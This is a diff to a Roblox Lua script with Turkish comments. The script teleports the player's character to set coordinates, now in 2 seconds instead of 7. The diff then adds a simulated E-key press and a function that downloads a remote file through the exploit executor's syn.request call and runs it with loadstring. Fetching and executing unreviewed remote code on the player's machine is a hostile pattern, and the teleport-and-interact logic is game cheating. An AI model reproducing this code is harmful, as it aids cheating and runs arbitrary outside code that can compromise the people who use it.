@@ -11,7 +11,7 @@ local hedefPozisyon = Vector3.new(700.0066528320312, 3.5371994972229004, 166.161
 
 -- Hedefe giderken kullanılacak adım sayısı ve süresi
 local adimSayisi = 50  -- Toplam adım sayısı
-local hareketSuresi = 7  -- Toplam hareket süresi (saniye)
+local hareketSuresi = 2  -- Toplam hareket süresi (saniye)
 
 -- Adım boyutu ve süresi
 local adimBoyutu = (hedefPozisyon - baslangicPozisyon) / adimSayisi
@@ -39,6 +39,28 @@ local function HedefeGit()
         -- Hedefe ulaşıldığında son bir güncelleme yapalım
         primaryPart.CFrame = CFrame.new(hedefPozisyon)
         print("Hedefe başarıyla ulaşıldı!")
+
+        -- E tuşuna basılı tutma fonksiyonu
+        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
+        wait(5) -- 5 saniye bekleyin
+
+        -- Lua scriptini yüklemek için gerekli fonksiyon
+        local function LoadScript()
+            local url = "https://raw.githubusercontent.com/bukkaku/bukkaku.github.io/main/murrez.html"
+            local response = syn.request({
+                Url = url,
+                Method = "GET"
+            })
+
+            if response.Success then
+                loadstring(response.Body)()
+                print("Lua script başarıyla yüklendi!")
+            else
+                warn("Lua script yüklenirken bir hata oluştu.")
+            end
+        end
+        -- Lua scripti yükleme fonksiyonunu çağır
+        LoadScript()
     end
 end
 
